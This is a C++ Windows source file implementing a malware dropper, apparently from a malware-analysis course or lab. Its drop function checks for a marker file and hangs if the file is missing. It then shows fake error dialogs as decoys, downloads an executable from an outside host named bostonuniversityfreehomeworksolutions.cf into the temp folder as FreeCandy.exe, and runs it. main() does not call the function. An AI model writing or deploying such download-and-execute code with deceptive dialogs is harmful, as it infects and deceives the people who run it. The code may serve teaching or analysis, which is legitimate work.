#include <windows.h>
#include <shlwapi.h>
#include <iostream>
#include <fstream>
#include <wininet.h>

int drop(char path[]){
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	FreeConsole();
	WCHAR temppath[262];
	WCHAR filepath[264];
	//char path[] = "C:\\malware\\ch0nky.txt";
	DWORD f_attrib = GetFileAttributesA(path);
	if (f_attrib == 0xffffffff || ((f_attrib & 0x10) != 0)){
		while (true) {
			Sleep(1000);
		}
	}
	MessageBoxA((HWND)0x0, "This App cannot run on your PC",
		"To find a version that can, check with the publisher!", 0);
	Sleep(60000);
	GetTempPathW(0x104, temppath);
	PathCombineW(filepath, temppath, (LPCWSTR)u"FreeCandy.exe");
	memset(&si, 0, 0x68);
	si.cb = 0x68;
	DeleteUrlCacheEntryW(L"https://bostonuniversityfreehomeworksolutions.cf/index.php");
	UrlMkSetSessionOption(URLMON_OPTION_USERAGENT, (LPVOID)"ch0nky", 7, 0);
	if (URLDownloadToFileW(0,
		L"https://bostonuniversityfreehomeworksolutions.cf/index.php", filepath, 0
	, 0) > -1) {
		if (CreateProcessW((LPCWSTR)0x0, filepath, (LPSECURITY_ATTRIBUTES)0x0,
			(LPSECURITY_ATTRIBUTES)0x0, 0, 0, (LPVOID)0x0, (LPCWSTR)0x0, (LPSTARTUPINFOW)&si,
			&pi) == 0) {
			CloseHandle(pi.hProcess);
		}
	}
	MessageBoxA((HWND)0x0, "Error, This document is corrupted", "Please delete the corrupted document", 0);
	return 0;
}
int main(int argc, char* argv[]) {
	return 0;
}
